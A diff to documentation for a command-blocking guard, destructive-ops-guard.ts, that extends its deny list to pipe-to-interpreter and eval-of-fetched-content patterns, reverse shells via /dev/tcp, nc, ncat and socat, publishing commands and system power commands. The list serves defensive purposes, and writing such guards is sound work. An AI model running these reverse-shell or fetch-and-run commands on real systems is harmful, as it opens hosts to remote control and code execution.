@@ -80,7 +80,9 @@ The block reason suggests `rip` or `trash` as safe alternatives with recovery.
 ### `destructive-ops-guard.ts` — Network RCE, public exposure, and power commands
 
 Blocks:
-- Pipe-to-shell: `curl ... | sh`, `wget ... | bash`, including process substitution `sh <(curl ...)`
+- Remote code execution — pipe to interpreter: `curl ... | sh`, `wget ... | python3`, `curl ... | ruby`, `curl ... | perl`, `curl ... | node`, `curl ... | php` (any interpreter), including process substitution `sh <(curl ...)`, `python3 <(curl ...)`
+- Remote code execution — eval of fetched content: `eval "$(curl ...)"`, `bash -c "$(wget ...)"`, `eval "$(curl ...)"` (backtick variant)
+- Reverse shells: `bash -i >& /dev/tcp/host/port`, `nc -e /bin/sh host port`, `ncat -e /bin/bash host port`, `socat ... EXEC:sh`
 - Package/container publishing: `npm publish`, `pnpm publish`, `yarn publish`, `cargo publish`, `twine upload`, `dotnet nuget push`, `docker push`, `podman push`, `buildah push`
 - System power (bare): `shutdown`, `reboot`, `halt`, `poweroff`, `telinit`, `init 0`, `init 6`
 - System power (systemd/NixOS): `systemctl poweroff`, `systemctl reboot`, `systemctl halt`, `systemctl suspend`, `systemctl hibernate`, `systemctl hybrid-sleep`
